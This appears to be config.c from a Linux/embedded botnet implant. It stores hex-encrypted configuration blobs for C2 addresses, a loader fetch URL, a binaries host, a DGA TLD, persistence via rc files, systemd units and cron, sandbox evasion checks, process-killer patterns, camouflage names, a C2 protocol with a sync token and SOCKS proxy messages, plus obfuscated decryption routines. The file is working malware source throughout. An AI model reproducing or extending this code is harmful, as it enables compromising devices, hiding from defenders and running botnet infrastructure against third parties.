/* ==========================================================================
 *  config.c -- Encrypted configuration blobs and on-demand decryption groups
 *  Pure C port of config.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"

/* ==========================================================================
 * RAW ENCRYPTED BLOBS -- hex strings, identical to Go config.go
 * Patched by setup.py when keys change (re-encrypted with new key material)
 * ========================================================================== */

/* @encrypt:slice serviceAddrs */
static const char *raw_service_addrs = "9dd3bba797428ed0c1b1c9eda219efde017a83e6090b1429fc47ae7982c70baa880d5db464139c48481752539fda8f9675d86d883681b0af6d00eb9bc9eb6d4fb274e2bdf38726a1d998728fe088a23d1156955fcbf786f459cf24420451c871334d61402dc5d648b31b1583d788d26f294adae5b1590ef7";

/* @encrypt:slice sysMarkers */
static const char *raw_sys_markers = "ab89e8ae0298a10b9113beafb4b0da18f93489352345f921c8dde1a63553bc766c49b2c34229eb703f62875b3ac4c276443f5695e5bc51f47bffc010db9e1e159852c4b78bf02ab6db71e395d380bc3fd25c301a3f166857f6756e460111fe83fe1221fcb2c4eda32d41875d7c7ab7b0746baab384f7f64606845287e9ac2ee6fe833d9c76709000292a4f82715724040f12283471c3";
/* @encrypt:slice procFilters */
static const char *raw_proc_filters = "62a8754560f8390b5ff4be598957145d50893e2e0bf836665dcfef723b794bd9e030384cb2f55b2debcc1c264d09831318247a4aaecd5b4f9742d3532a1ea18c10bdd6d93bd647407960a82e20a540f704cac4030ac6cd7568910d4457bcfe0d95283072515ebf6d5aacd758d277120844cb5880a80320788a5bf477c4c965f263d03e572d5dd10ef10136184f6279c086f72b8280127353e693291fce6efa96180819f53cd64c1b715f2c77a0ce7f9567c344d1f55bfe26d8689c829557c38d7cbe0b5e4ca9d55959fa319fb5be4abcb66b1aefcfe1b73257a55af29306e70b17016996df44c32e08fbca916f2c33c8d4ed8cc23f3e78461c7e2f5c8163c64ff9e59171018c2e311164df5b781ab466bf3d21a493c03f0183cb689c8baef3a5cfd3b19a454e45be626c5060063d1e306dcf2c86d40ced3678680da848faac2cc958167d1d090da7e0ee49209519abb10c7e7e740ad62dea734fa4d7060b89402aafc0d0eeed18de9f3eb758925f387c8fc31f609a5a5eb5e82b3411e28dc83c73d559fda7b2aa18e2b21e125e9ea7b35cb25c3a21f1f172f7c9ddc06f2bfb546ed5855156ce7b80f12856a52c06a3d09aa17d52b7531f4a663e3a8d1abf085cf21ff4926e22f64f90390a2f25520ce4c390be2b85d18924359f303bd1b88ec6e6c09702ae20e0a135b93a88d0328ab79d55bcbfb46eaba6045c29ea80d56a2cc6a48428ea7995bf4e21384d5a6d3688c3931e162b9b4f48b0a8cd791633a6ac9073e5c76a7cc5fd9ea5de84ca822762a9d69ded46c7f50b1131682776391277f636d93da08a1535980eab7d8d50172c790376fe0e5e58ee99491b2a87ae6e73d08a1d9c088ebbc1f5aea685fe109a2153d5434bc284c852358dab0391d7c7ab5b4a24457d5a70875eda2cac0370a068a333bff4bd63477c5cdd89fd8b22f740e8f43be83244885efb479da2965573841999f8a1a9225f0bf24dfa547d6ee686cbb89ac5ef40c21bfbf6f5a0ae88420e9b334670139816d9f9db2e6824352cb877a4daecd7782b8068dbfadbc3d749258189ace40e268091caca06f8f3a2cb7807235191b90503a05ad96ed8b60cd45bfa85535b11fa3ec6171c28619d493a68e82b75383d6c20cb252914538bdc33ab6d5145a51ee6e16a973688824b8d6badb0bc564842ae3fe9fb954980d9278317d56cf4f3cbbe";
/* @encrypt:slice parentChecks */
static const char *raw_parent_checks = "04ae4623c58f8c3378e21ed226f0f18e57af9bbfb7bbcd1696278090109343e0643aea3b7b65d189f235c4b3a222ec70fe87fdd09ae6e3468399113a8b6555b0603df1d245cebb0370414acaa55be22ab5ef15b4650805ea25eae9092f55669b14d0c23668e0001382165b2449e4a8bc6eebdf47f230641432643d8cfe9c022285aabad75a820e0cd265d3db320295b8600f559f7db5ae91";


/* @encrypt:single -- persistence paths */
static const char *raw_rc_target = "11811efaed26b7f6c0ed5ec1907dfa2f9a49f936333871c15c819b8e4e830278a38831b01f7c5676d8cebec6ef3d8fbb6c0067424d4a39c1ad";
static const char *raw_store_dir = "5d6eb236aca0f52dfc45a601c192dc8131bd8df2499252d56ea2b742e6aa7f6a128b104d508a5afcfbf4bcc4a20c6bfde7c397f87fba16b996e127ff11ee2fc52dc59b151d";
static const char *raw_script_label = "83c9f4632c66ed6d2d125a61efe1d19202bd68a5b4cf9a0c0559b9312d0b8fda102f8d6ef8fe1730788f6710b98292ca5deb3ba53c1d0e1a90db00c71d26e7b2b2";
static const char *raw_bin_label = "b93d4437e34a6e8d8eea2e695d8b00f7a0125be38be98ffb65d8adceaab58aa16be779f8e13f450b7a565db812fdd18c35516034a8e5149a0ffed0";
static const char *raw_unit_path = "77b74bb9dfdc332999853ca40ff86ed7ffd412f5141ae4086e83e9f576fce0b5ed4b226d431136dd407ecdd10ad533cda2dc2e7366d036fb6f9491b241b2c5fc45b2f8570a344dfb6d20682bceda6045a413224a7d58";
static const char *raw_unit_name = "bb9289d04f885607ce4c4bc12b7e44b90d16b06dd47e8da1189ace0120e3db850ba17e4e42eba16aba3a112288e0b52e6ad8992eb7cd1a7d70b51294da15367eea08";
static const char *raw_unit_body = "b10d1f3c02208d4668ca62a2fb1db049583563d8780fdf3f421d2575a8d2268f162e61faed947fe386dd6ae2ff53aaa0bac9c58f8af971bfcceacb290d5346a7b6b9f539b7bfa2abd584cd939a69862e11f2b780521d9a0bff6f5b880be0f4bbf76f3e637c9781795e731e81edc00ccac84221fdfaffe0897e574d1d8b609069e295e1859cf6f54356cf328863779b820492c5042beb9d17b2bc26740e06b9a503a198e271e6ff59ec53c956218edd88118bb8e3e204b35fe0923aa096803d2484c02aff56356c058c8241a8a775183f05aa9bb4c1e0da655c379ef1ebc3bc585b0463498603fe512930";
static const char *raw_tmpl_body = "a0313f23bb77427b2eae8efda788748bc4ecad4f99eeb701cce771cf6c7fb73154f06e27b4337b144f571a685cc9e0223020b788da9cb7d812d170bcdbe930f51a4c8473ed2a011efb0d446effcad5e78c1eea6079dc1b7f9805619f3f033285f220454b6566d415e4e5742b692e1b6c16159df89067dbfc096096489679851f50d226abef9acd1534971b47728ab1deeb106a07bef64c6691f69574cfec960cf0740f629fa8850ed16096a39925c0d56f2ce466cc929004bc760338147bf69d79dbb0125a18a8fba0463d60253598f36fe986143699c7eb90cddda4fc65ca708d";
static const char *raw_sched_expr = "c8bd5fc48ac3351e53132aa9499f9debe4f75f35c894a19ca6e68695f1aa19b5ff2e5034e50c313edcdf591a9c351b1080c7dcdfb4f5f7";
static const char *raw_env_label = "ac09b04d17585964a421bb9f02364ef40440a685501e3d2cb933ee8ce0363eb6e6dec4551cab5d34e8e4543b4f005bb16f7904e72eb8720e5a";
static const char *raw_cache_loc = "af3590b176ae5f181bd0f5bec9834a839dc541a7466b9643ce624a35a40d1118d19015b0c6f5f59b72bc5316b4a73bd44a04fbdf569af5206d30a93b25c1";
static const char *raw_lock_loc = "1f33f730d19a023d7a3d3b3a3a5391fd30b224e2c7f0870d80f384d0c7d467858600c7ba1d997d302dc6a83144952b4cc529eb13896c1840994af8153f6d089d1c3d";

/* @encrypt:single -- protocol strings */
static const char *raw_proto_challenge = "802f25447aa53aba4ae6d4a30f9320305a91de454b58a138374e1a2ee577b76727a0918ed90b81660deb54c4bb4d81a20e4d9e07fab2a2048c0076";
static const char *raw_proto_success = "bd4e25828774d90c4b53c5311d9c9137abe6811849530652bb1dbd72ff852a2a8de16e3d2e33848a2b3f8ce2c51b222dc4ce73506e4f58ed";
static const char *raw_proto_reg_fmt = "9499670be67f714c4bb3ac5897c2c1730fcebb17bc1d2f84bab4532f28dbfcd0325b7ac5d0e20816e3d15dea71ac2d4cf42d55850d7ef00d10afbb65123d526cb97406593e22ec8621d70b4d";
static const char *raw_proto_ping = "42e162ff5df8980f10cd2166ae2653a766f160136022aaf2713ff4ab1533ddf7b6c730f93608e5cd1e6a10925b906c2bb7";
static const char *raw_proto_pong = "9192bd33013abfd24469b5cefef62db3c69cb7f871b96bc8f324854d0430fe4ac32dfe5186126296b663fe68b0e94c06e9";
static const char *raw_proto_out_fmt = "b4370ef86f76692b761c8a31f40d54373e89522390ab2b2a1dcd578f7bc51ddcacb9c0b1cfedd209ac181de045ec48246f8bfac8423593d918f8";
static const char *raw_proto_err_fmt = "d7057e12f9f34c83ace86da5dbfa507eef9867fa7b595979aaba86a987175f8c2ae32075a7efc0ff359f12c24eea9bb6d85ed20c80";
static const char *raw_proto_stdout_fmt = "ab546cb1e4a7946151caa68122f08775b43835a504157d0bc206a001de676560206ec18f8b12c74b1230a7556746819bdec29ab3757c";
static const char *raw_proto_stderr_fmt = "aea258245ee5145c83e9d13e0e9c7350b4ab3e4ec47129a52cfb4d44c1c9286a81e1c1648da2114744a2446b407785730949a057e798";
static const char *raw_proto_exit_err_fmt = "bc83b854c7015d62903b3583faff3c16d6a186633f42e6c85cad92bda892e2a3eeb03a439dffefd44a142ed980d406c158364bcbd24c6639";
static const char *raw_proto_exit_ok = "fdfd2c6e44e0c1475f2d56e1e7b4c0c3315e83f67409c81291c76828038d40f3737bfc1f27087a06ae0a4f3ca1777bc313327c80bbcef137e7a6c5bb5d98aec87f36a6b322811f5d7fec7ab5e59dfb4687968c";
static const char *raw_proto_info_fmt = "caa24720d1dc9d50570758577c376700ee2bc20c8f83e4ac0f5a43c20e51ee23ffe92c2e2ca01f8c71d40d23e1205ca23a54745e";

/* @encrypt:single -- authentication token (replaces #define SYNC_TOKEN) */
static const char *raw_sync_token = "ad9e0371a8fec3ad154470becab80944cfc84db0d5a8713275b57ec46e80661e92696ff89e18ee8938c299259344fd5cd5d6ee44c89441519f0729f2"; /* patched by setup.py */

/* @encrypt:single -- response messages */
static const char *raw_msg_stream_start = "b44ee05aba237440edb95f64ef6d078385847149e0eb6b70f79b7b59b4d0b5e75377645399ae79dde83d7769f43697e124bb1be1ddfdd9d3091bb861ae";
static const char *raw_msg_bg_start = "9ab775c2a21677b004a120f8356294425eefc01891334641c5e011657268275eed62bbae8a0462c84f27aa628a7e895c09c649bdb5a27d5e8d43d8b33fd2667a07de429fce4eb5de";
static const char *raw_msg_persist_start = "e0f4254925624ae1c8a9f7b7ade718977ef2338641b4cb85f300fc2a08373b647b9e23019a31ee24e38c101196280f52d3ed5e5fb0f2576430a82b02dc75af8a3979fb41ffdab7977a4ac373";
static const char *raw_msg_kill_ack = "72612b1a50daf35373de76695bef6ef28e91fe62f89007003fe366687a515576489d797e7885977b3dfb1ba61f07045d14288a996906752aa580f6a4d3ca6b8f6fe802412c9a23c98150cf32";
static const char *raw_msg_socks_err_fmt = "788dd70d42c38135d07467e6a9aae826cd7b069cf5c9a33a24a604367604da81b72fbd0c4c56949f9dcc98ba57a6e9b2e276a2bf0f54f4bb6c566d72f414";
static const char *raw_msg_socks_start_fmt = "d22f829797c5002d5651558773026f2aa36bcb80be92e627bed503f9d50224bfa43adbe1d3530cf14832f59d763b044f073f5eb730db68fd458b864ebad23d63d758";
static const char *raw_msg_socks_stop = "64111785f6a5f8aefafc46672eb7156c6704fefd3c091ff27c5e9a056756bdd7252a506c0f93bbdbb02da7f9d5df486ab50854bbfffe0b176457ae126105a71a2fe6";
static const char *raw_msg_socks_auth_fmt = "0f2d6f8fc91d742e05a51baf2e0e1fa0b7f678ca099bf558201308769bce671755b317bfc86e89e18e38b1dde63365e875797a6676579fcf03956bcd7feec83a122b95";

/* @encrypt:slice -- DNS / URL infrastructure */
static const char *raw_doh_servers = "d0947e5e6ec649373aa947b092400903da682978a817f1e31ed1b316c7f184a3a4fc433ea7fc5d05a48d1b12a3bb7d2f17deff7738a732ba9564182763c719b7bc26b7ca0e1d822afb49abac405c1125715ff176f88a2f943c5a2fd011d587a4f11f8b074c88c3bfea279b7b50cd7f99a1dcca2933bbc6270b7ebd768bc9d113e902d9fd53a6ce9c516e8a2274c17dc57f7d";
static const char *raw_doh_fallback = "198d030d3f85a00406ebb97ea965ba13561e313df30bd9e9e9747818eb7b739f37250ab25e80fe0b521b8553c23db9f974b19e3426205f483214fd89069a09d841c9599f277e63741c2f2e2791fd70ac8b9984ce1cc1056a3f9f22b56a1b65005e2c17488811e2c9da4915";
static const char *raw_resolver_pool = "f3b4040f13203169ef8e246ce2b04242b1132ec9805d7b4fe6880e1a7f1e34b6fe94099486d7b08a5b943c3b58dc8ef81e15227ac69900f382b2016cf740a5d0b90530992f7981ec67b8ca2cf7e67e56acf8754d0eea63363395a8a8b049";
static const char *raw_speed_test_url = "b869bcbc40d400d9b0cf657f141c1883ec03ab94ab2ae015b9014f20f319dc8ad2cf2e812553250c58f9a9de980b58efe7eb085fdfcc1b3e3e8f368fa81af34f4b2e036d75eb40143ca8e3bda7f896c12d97b4601ac766bc5c6504df";
static const char *raw_dns_json_accept = "9884b44078389f7e173c0eaab2da96f0364fae045b15fc0627b9fb4c91d8edc45f9c9cc002fef81eaf13bdd59e289387da257e4ddf06ca8386e701eb4cd35d70";

/* @encrypt:slice -- opsec / killer */
static const char *raw_sb_names = "b2d2fbab2e33eb89a1d5b5b067b32b526a691f7b5605b8b18311cd749e29c5ba1f2d09be35305ae8606bfb3ed2826d0defa0c61135a7c9b095da2c9c5ffad7390e96024e0c5a9c0d32fb3be6ce4125c4998bc85f19d34e9a0b500559d992d3c352c67d210600c66ae70ca32b9b106211010e89cb3bdc7bd761d6bd55c5b1b4babd2716864ab7d7cb3987bab92fd018bf5ad3441064";
static const char *raw_kill_patterns = "fb64aa5306bb54256293d7c2db7bd3325d9bf825234bcf5bae73b82fb9b1c835cd53e2c844f6620166d8b6dadca99d406165bbd7ce5466180e4e3d1e79c92235e6923d48b5e97c56c0a32c5e2e88d658b3ab0b37ba2f3439c1859d230daae178098c9b54536f2c7d39403f29312bbc061748d885fb853a69769734a1896bbe075014a982044bc40e47a9a02d01486be58628cf438a07ed77827defcc525194615ac0b1906e39dc528180ba8d49f50ee799b3d1f06551851b374e2548bf5b3637b72043a15c9125ae466f7e344d2bfc10c72a01eb846c31a244a9b20db3a7862c1b212dc42100d9fa5c9fe4e1bc4e4612873db224173bb595b7bfa37c20a11e932798205b83cf3d1d1d0c5bcec20bf92e385ace3bbd0cac02ef33a0c5d4cea85a665c8369a9c3613b35a41a7e208fbe6c311fa94be7ff988aa5f51f992ad7be4c5edf921207f1501e3afb5e839f8448816e5da9f62f1188b1416625a5f6f21af3fdcd2b32c442adb0a46714d7c0a8ecd1fcd718e44448903e0278b738361d709755228de75799e3ba1b7c9742521a89512d69e84a5abf5c0799b496ff117ea327e125c04f0e406d7d40d24ff82e81adb520b95bc55319f4e3d0be4c68e98335f5ebb3730bf7b827b759bd56aa3f5cc4332c0ccc61153956bcf039c62289f4540632e6795de40331e0b42e9ca47dd3f8872f8441de38a3b4acceb3e1e5a2de7371be70a0ffc7980709547cf0f2b9c955d39043c0a279103f0fb92a2055254914f32e8419ae676c4322b5835a3cafd59cb4e7835e950df407031cb72be0f71e1f83f6cf17b13099781954a256f3eea962be5b0a12c7d96072b3f233ba19ef217f9c50d3235a826486eea468449f65160456ffeb48eb201af6e7621237c18082b1148dc529243df01960ad0bc52a031dc53aaef5f252c2c29b6d1d75c848ead0cc126365196a8518dc48e2c22463635d";

/* @encrypt:slice -- camouflage */
static const char *raw_camo_names = "d8fc67432ee1cd4efaaddfc7d8b3ff2baee3360cd8ee3550a9fb0844e9e92e88c7543166511ed03161e5a21427d7f7b0c3418b140ad8efebabb707a7b7f4f182865a337cb4b38e18459f6df57eead507953ada1d3b1a68719a5a18efb9a1136eadb5b386d89000";
static const char *raw_shell_bin = "4adfafc93dc3a8dabd4bd429d4fa0572b4aefe37a8098abfb420a8a7be94c9e289336b90c9ae8a1e7fd15d3e8b39aef91faaae";
static const char *raw_shell_flag = "bfd5daafcfd262b42f0bceae27dc5f133139e5fa347c78cab488323647305c9cea484c697927644be88d35088642";
static const char *raw_proc_prefix = "30c24547859d222fb95709e6795171edfe5ff6869bce92d152c0ec387b0b75b9e18ae153b7f4e27c9743d5f04693bc6f5b04";
static const char *raw_cmdline_suffix = "790357eccede718139e4c99d02dbf3cc06f4102108c0d2ac94cd58da594639428d64c99ce4be929ab33c5bf7ef94d02b9ef4d56c";
static const char *raw_pgrep_bin = "f402a9b24da1f41aff149c93b1fd514ada66842d32a27505f7db0da574b8ffffe53675051880bd15816739635e7def475d0e8305451575b612f4";
static const char *raw_pgrep_flag = "b5195afb5ae086bdeae23c595736a7679a482e04b4baaa67b33c6789910727e6c671a41d23ae930c797a578acc98";
static const char *raw_dev_null_path = "a2028cb7ac10a0c0fea3659dcc4d2ad8a7c1f6aca29f1e2803a34bc521d0a947a23c25b682508533e97d03d044a942cc4073c1caed";
static const char *raw_systemctl_bin = "1914325db7507a8f9cb0a96b76436725fcc3093cb3fe817da1cc89926d1ff6182c3e2726afa16262cde4c72228db9e8092dd477158d138e8b38a";
static const char *raw_crontab_bin = "13bab4abf4878abf2cf163287a8ed0ffe4f470fbc0861c577b9d812544343ee2bc9a57f2603f3d282a299d64dce79769d5a3d741066aee00622476f7";
static const char *raw_bash_bin = "8100d1f332dc27a0a612dfb869d9be0eacbe41adff9349d207eaa8e462fbe3bea0f75d4710c0ea5f68fea4921a5aa0c67c77dfc8ce";

/* @encrypt:single -- loader & bins server (patched by setup.py) */
static const char *raw_fetch_url = "c146fbbd7c009b69c138e563b9539eb98384e05705a8a9a1844e6addcb9f0ba5d456cee6e49aa6f651f140dcf7f3a9e58f050352027b144b1e702b81161afecdd3ea909a71e6b9866fd651b95e7e488aefc8a5850689c4e84bdb31";
static const char *raw_bins_host = "9ad150b9ccb3aaea57fd9bed11a22d3a923a6d3be4b4cf6df8b89d9e8ec422af278f3d8dd78a8740c6c6d332124028f40ac40b18ebc1fc71dddbd207a53d74a305df1adeccb3f714fc3261e4";

/* @encrypt:single -- build identity (replaces #define CONFIG_SEED / BUILD_TAG / DGA_TLD) */
static const char *raw_config_seed = "fd9f68c619979912eac7de2fb2500095c0d393dc38170fd500b62b022d54fce0a423dd7724f7b851279815b053337ea4537fb1ec";
static const char *raw_build_tag   = "6bb1cababe2be1b475f2d4a4d87eb7a0afa51200ae8e392db29e411caddbc1ca9a72fd2bcfea999b44c36d19d28126ca7a71fcff512640";
static const char *raw_dga_tld     = "45ede8bcfe1a6283e5856803f8037577a597f416d63be533003a1f4daf92bc137bbbc53f41be14de39828fd8738e6a4d";

/* @encrypt:single -- SSH client banner (replaces static const char* in ssh.c) */
static const char *raw_ssh_banner  = "e1cbb05f32b0064e60628c9a331892e53ddea4aef5e6bb141d1a4b643a9420fe403c128320b2ccd59d18ef53572b086e4dab92299ff648aaec9ba4ca4de72610974d9f";

/* Decrypted at runtime — used by scanners and persistence */
dstr _mW2ZD2g;
const char *_Gy7MD4D = "";

/* Build identity — replaces former #define CONFIG_SEED / BUILD_TAG / DGA_TLD */
dstr _gC8se3d;   /* config seed  */
dstr _bT4ag3x;   /* build tag    */
dstr _dT5lg2z;   /* DGA TLD      */

/* SSH client banner — replaces former static const char * in ssh.c */
dstr _sB8nn3r;

/* Decrypted sync token (replaces former SYNC_TOKEN #define) */
dstr _Lv3Qk8T;

/* ==========================================================================
 * HELPERS
 * ========================================================================== */

/* Decrypt a hex blob to a dstr (single value) */
static dstr decrypt_single(const char *hex_blob) {
    dstr result;
    dbuf blob, pt;

    ds_init(&result);
    if (!hex_blob || hex_blob[0] == '\0') return result;

    blob = _wu2rB4w(hex_blob);
    if (db_len(&blob) == 0) { db_free(&blob); return result; }

    pt = _PP4rn3w(db_ptr(&blob), db_len(&blob));
    db_free(&blob);

    if (db_len(&pt) > 0) {
        ds_setn(&result, (const char *)db_ptr(&pt), db_len(&pt));
    }
    db_free(&pt);
    return result;
}

/* Decrypt a hex blob to a strarr (null-separated values) */
static strarr decrypt_slice(const char *hex_blob) {
    strarr result;
    dbuf blob, pt;
    const char *s;
    size_t total, pos, nul;

    sa_init(&result);
    if (!hex_blob || hex_blob[0] == '\0') return result;

    blob = _wu2rB4w(hex_blob);
    if (db_len(&blob) == 0) { db_free(&blob); return result; }

    pt = _PP4rn3w(db_ptr(&blob), db_len(&blob));
    db_free(&blob);

    if (db_len(&pt) == 0) { db_free(&pt); return result; }

    s = (const char *)db_ptr(&pt);
    total = db_len(&pt);
    pos = 0;
    while (pos < total) {
        /* find next NUL or end */
        nul = pos;
        while (nul < total && s[nul] != '\0') nul++;
        /* push substring [pos..nul) */
        {
            dstr tmp;
            ds_init(&tmp);
            ds_setn(&tmp, s + pos, nul - pos);
            sa_pushds(&result, &tmp);
            ds_free(&tmp);
        }
        pos = nul + 1;
    }
    db_free(&pt);
    return result;
}

/* ==========================================================================
 * ON-DEMAND DECRYPTION GROUPS (pthread_once = std::call_once)
 * ========================================================================== */

static pthread_once_t s_boot_once    = PTHREAD_ONCE_INIT;
static pthread_once_t s_sandbox_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_network_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_proto_once   = PTHREAD_ONCE_INIT;
static pthread_once_t s_persist_once = PTHREAD_ONCE_INIT;
static pthread_once_t s_killer_once  = PTHREAD_ONCE_INIT;

static void _Eq3eR2E(void) {
    _yj8Yv4L     = decrypt_single(raw_env_label);
    _Qt5Ey5X = decrypt_single(raw_dev_null_path);
    _cd2pA4A     = decrypt_single(raw_cache_loc);
    _aN8Lh6d      = decrypt_single(raw_lock_loc);
    _Xx5Rw4X     = decrypt_single(raw_fetch_url);
    _mW2ZD2g = decrypt_single(raw_bins_host);
    _Gy7MD4D = ds_cstr(&_mW2ZD2g);

    _gC8se3d = decrypt_single(raw_config_seed);
    _bT4ag3x = decrypt_single(raw_build_tag);
    _dT5lg2z = decrypt_single(raw_dga_tld);
    _sB8nn3r = decrypt_single(raw_ssh_banner);
}

static void _XW5aK8B(void) {
    _ZR2yx2H    = decrypt_slice(raw_sys_markers);
    _oE2jB5C   = decrypt_slice(raw_proc_filters);
    _zR8sK4g  = decrypt_slice(raw_parent_checks);
    _Ep3ej3c    = decrypt_single(raw_proc_prefix);
    _eB7YC8M = decrypt_single(raw_cmdline_suffix);
    _Uj4hP7a      = decrypt_single(raw_pgrep_bin);
    _Ve2pe8n     = decrypt_single(raw_pgrep_flag);
}

static void _qA7Ui4L(void) {
    strarr addrs;
    size_t i;

    addrs = decrypt_slice(raw_service_addrs);
    for (i = 0; i < sa_count(&addrs); i++) {
        const char *raw = sa_get(&addrs, i);
        const char *start, *end;
        /* trim whitespace */
        start = raw;
        while (*start == ' ' || *start == '\t' || *start == '\r' || *start == '\n') start++;
        end = raw + strlen(raw);
        while (end > start && (end[-1] == ' ' || end[-1] == '\t' ||
               end[-1] == '\r' || end[-1] == '\n')) end--;
        if (end > start) {
            dstr trimmed;
            ds_init(&trimmed);
            ds_setn(&trimmed, start, (size_t)(end - start));
            sa_pushds(&_zU4TP2B, &trimmed);
            ds_free(&trimmed);
        }
    }
    sa_free(&addrs);

    _fx8Fz7F   = decrypt_slice(raw_resolver_pool);
    _fq5Hh7H     = decrypt_slice(raw_doh_servers);
    _GT2zC6e    = decrypt_slice(raw_doh_fallback);
    _CT6sh3M  = decrypt_single(raw_speed_test_url);
    _so3eq8T = decrypt_single(raw_dns_json_accept);
}

static void _gd7nE8u(void) {
    _Pi5LD4t   = decrypt_single(raw_proto_challenge);
    _KB5jb2q     = decrypt_single(raw_proto_success);
    _QC2kf6S     = decrypt_single(raw_proto_reg_fmt);
    _fp7cd2e        = decrypt_single(raw_proto_ping);
    _gp5vZ6k        = decrypt_single(raw_proto_pong);
    _nE6py4K     = decrypt_single(raw_proto_out_fmt);
    _QS4Kn2u     = decrypt_single(raw_proto_err_fmt);
    _Ag2PA3Y  = decrypt_single(raw_proto_stdout_fmt);
    _sq2vi4d  = decrypt_single(raw_proto_stderr_fmt);
    _yh8Vu8D = decrypt_single(raw_proto_exit_err_fmt);
    _VD7BQ4c     = decrypt_single(raw_proto_exit_ok);
    _mi6YG6d    = decrypt_single(raw_proto_info_fmt);

    _Lv3Qk8T    = decrypt_single(raw_sync_token);

    _KZ7LL3b    = decrypt_single(raw_msg_stream_start);
    _Vm7uC8w        = decrypt_single(raw_msg_bg_start);
    _HH8Az2g   = decrypt_single(raw_msg_persist_start);
    _hb6Aa4L        = decrypt_single(raw_msg_kill_ack);
    _zR8oC6c   = decrypt_single(raw_msg_socks_err_fmt);
    _hD4fS7K = decrypt_single(raw_msg_socks_start_fmt);
    _cJ8BU8L      = decrypt_single(raw_msg_socks_stop);
    _am5bJ3X  = decrypt_single(raw_msg_socks_auth_fmt);

    _jy7Ho4s  = decrypt_single(raw_shell_bin);
    _oD3KN5M = decrypt_single(raw_shell_flag);
    _da6QF2F   = decrypt_single(raw_bash_bin);
    _xJ8ym8N = decrypt_slice(raw_camo_names);

    /* Initialize default proxy credentials if not already set */
    extern const char *default_proxy_user;
    extern const char *default_proxy_pass;
    if (ds_empty(&_yr2Dc6W) && default_proxy_user[0] != '\0') {
        ds_set(&_yr2Dc6W, default_proxy_user);
        ds_set(&_uv4SZ5A, default_proxy_pass);
    }
}

static void _Nf4Kn4k(void) {
    _Xw5Jp4W     = decrypt_single(raw_rc_target);
    _UW4jD7J     = decrypt_single(raw_store_dir);
    _xT8zC3K  = decrypt_single(raw_script_label);
    _Cs5Qb7D     = decrypt_single(raw_bin_label);
    _BS3jN3L     = decrypt_single(raw_unit_path);
    _PZ7PR8b     = decrypt_single(raw_unit_name);
    _zP2mv4Y     = decrypt_single(raw_unit_body);
    _rM3Ck5U     = decrypt_single(raw_tmpl_body);
    _aZ2XV2A    = decrypt_single(raw_sched_expr);
    _zu2uc2Y = decrypt_single(raw_systemctl_bin);
    _iG6pj2F   = decrypt_single(raw_crontab_bin);
}

static void _FD8XT6f(void) {
    _Ds7cV2u      = decrypt_slice(raw_sb_names);
    _wP7xV7q = decrypt_slice(raw_kill_patterns);
}

void iB2Zq4a(void)    { pthread_once(&s_boot_once,    _Eq3eR2E); }
void xM3Hd6X(void) { pthread_once(&s_sandbox_once, _XW5aK8B); }
void Ng4eX6x(void) { pthread_once(&s_network_once, _qA7Ui4L); }
void DS4RR2W(void)   { pthread_once(&s_proto_once,   _gd7nE8u); }
void Ri2bh5v(void) { pthread_once(&s_persist_once, _Nf4Kn4k); }
void PP3yJ4J(void)  { pthread_once(&s_killer_once,  _FD8XT6f); }
